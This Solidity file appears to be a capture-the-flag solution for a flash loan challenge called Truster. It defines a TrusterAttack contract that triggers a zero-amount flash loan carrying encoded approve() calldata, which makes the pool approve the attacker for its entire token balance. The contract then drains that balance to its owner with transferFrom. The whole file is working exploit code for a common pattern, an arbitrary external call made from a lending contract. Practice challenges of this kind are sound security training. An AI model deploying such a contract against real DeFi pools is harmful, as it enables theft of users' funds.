// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
@title Truster Attack Contract
@author broccolirob
@notice Flash loan provider allows us to call any contract we want from it's 
own context. Which means we can approve ourselves to take the funds after the 
flash loan transaction completes.
 */
 interface ITrusterLenderPool {
   function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
 }
contract TrusterAttack {
  address owner;

  constructor() {
    owner = msg.sender;
  }
  function attack(ITrusterLenderPool pool, IERC20 token) external {
    require(msg.sender == owner, "Only owner");
    
    uint256 balance = token.balanceOf(address(pool));
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);
    
    pool.flashLoan(0, msg.sender, address(token),data);
    require(token.transferFrom(address(pool), owner, balance), "Transfer failed");
  }
}